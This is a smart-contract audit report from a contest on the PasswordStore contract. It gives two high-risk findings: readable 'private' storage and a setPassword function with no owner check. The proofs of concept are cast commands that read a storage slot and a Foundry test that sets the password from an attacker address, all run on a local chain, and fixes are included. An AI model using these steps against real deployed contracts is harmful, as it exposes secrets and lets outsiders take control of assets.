# First Flight #1: PasswordStore - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
  - ### [H-01. The password is never stored privately in a variable, even if it is marked as private.](#H-01)
  - ### [H-02. Developer forgot to add the onlyOwner protection to setPassword()](#H-02)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #1

### Dates: Oct 18th, 2023 - Oct 25th, 2023

[See more contest details here](https://www.codehawks.com/contests/clnuo221v0001l50aomgo4nyn)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 2
- Medium: 0
- Low: 0

# High Risk Findings

## <a id='H-01'></a>H-01. The password is never stored privately in a variable, even if it is marked as private.

## Summary

Marking a variable as private doesn't mean that it's hidden from view. Any user with enough knowledge can see the data stored in it.

## Vulnerability Details (PoC)

To prove the concept, we need to deploy a contract on the blockchain and add a value to `s_password`.
In our case, we use Anvil (Foundry) and deploy the contract on it with the first account given to us.

Then, as the owner, using cast, we set a value in `s_password`:

```
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 "setPassword(string)" "banana" --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bxxae784xxf2ff80
```

Now we are going to run 2 instructions that do not require user validation, i.e. we do not use the owner's private key to obtain the information.

First, find out which is the memory slot for `s_password``

```
➜  2023-10-PasswordStore git:(main) ✗ forge inspect PasswordStore storage
{
  "storage": [
    {
      "astId": 43436,
      "contract": "src/PasswordStore.sol:PasswordStore",
      "label": "s_owner",
      "offset": 0,
      "slot": "0",
      "type": "t_address"
    },
    {
      "astId": 43438,
      "contract": "src/PasswordStore.sol:PasswordStore",
      "label": "s_password",
      "offset": 0,
      "slot": "1",
      "type": "t_string_storage"
    }
```

As we can see, it is slot 1. Now, we check the info inside. We get the information in hexadecimal, so we have to translate it to ASCII.

```
➜  2023-10-PasswordStore git:(main) ✗ cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 1
0x62616e616e61000000000000000000000000000000000000000000000000000c
➜  2023-10-PasswordStore git:(main) ✗ cast to-ascii "0x62616e616e61000000000000000000000000000000000000000000000000000c"
banana
```

## Impact

Since the password is no longer private, anyone can use it to change information, make transactions or steal assets.

## Tools Used

Foundry (anvil, cast), terminal.

## Recommendations

In web3 we do not use stored passwords as a method of keeping things private.

There are 2 ways to secure the systems:

1.- Asymetric encryption (wallets or signatures).

2.- Access control modifiers. We can use the Open Zeppelin libraries which are specifically designed for this:

https://docs.openzeppelin.com/contracts/2.x/access-control

## <a id='H-02'></a>H-02. Developer forgot to add the onlyOwner protection to setPassword()

## Summary

The function comment for setPassword() reads: "This function allows only the owner to set a new password", but the developer
forgot to add some kind of modifier to secure the function, and it is external, so anyone can set the password at any time.

## Vulnerability Details (PoC)

Check this test function created with Foundry

```
function test_setPasswordAsAttacker() external {
        vm.prank(address(1));
        passwordStore.setPassword("banana");
        vm.prank(owner);
        string memory actualPassword = passwordStore.getPassword();
        assertEq(actualPassword, "banana");
    }
```

If we execute it:

```
➜  2023-10-PasswordStore git:(main) ✗ forge test --mt test_setPasswordAsAttacker
[⠢] Compiling...
[⠢] Compiling 1 files with 0.8.18
[⠆] Solc 0.8.18 finished in 902.07ms
Compiler run successful!

Running 1 test for test/PasswordStore.t.sol:PasswordStoreTest
[PASS] test_setPasswordAsAttacker() (gas: 22234)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.31ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The user address(1) is able to set a new password.

## Impact

Because any user can set and subsequently use a new password, any application or transaction that depends on it is compromised, as is any asset.

## Tools Used

Foundry, manual.

## Recommendations

The best way to secure an onlyOwner function is to use the Open Zeppelin library, as it has already been proven by high-level security researchers.
Check the information in: https://docs.openzeppelin.com/contracts/2.x/api/ownership#Ownable

As every function in the contract needs the onlyOwner protection, another way to secure the function is creating an onlyOwner modifier

```
modifier onlyOwner() {
        if (msg.sender != s_owner) {
            revert PasswordStore__NotOwner();
        }
        _;
    }
```

We have to add it to the function

```
function setPassword(string memory newPassword) external onlyOwner {
        s_password = newPassword;
        emit SetNetPassword();
    }
```

And run the same test to prove it works

```
  2023-10-PasswordStore git:(main) ✗ forge test --mt test_setPasswordAsAttacker
[⠢] Compiling...
[⠒] Compiling 3 files with 0.8.18
[⠢] Solc 0.8.18 finished in 911.27ms
Compiler run successful!

Running 1 test for test/PasswordStore.t.sol:PasswordStoreTest
[FAIL. Reason: PasswordStore__NotOwner()] test_setPasswordAsAttacker() (gas: 10771)
Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 426.38µs

Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/PasswordStore.t.sol:PasswordStoreTest
[FAIL. Reason: PasswordStore__NotOwner()] test_setPasswordAsAttacker() (gas: 10771)

Encountered a total of 1 failing tests, 0 tests succeeded
```
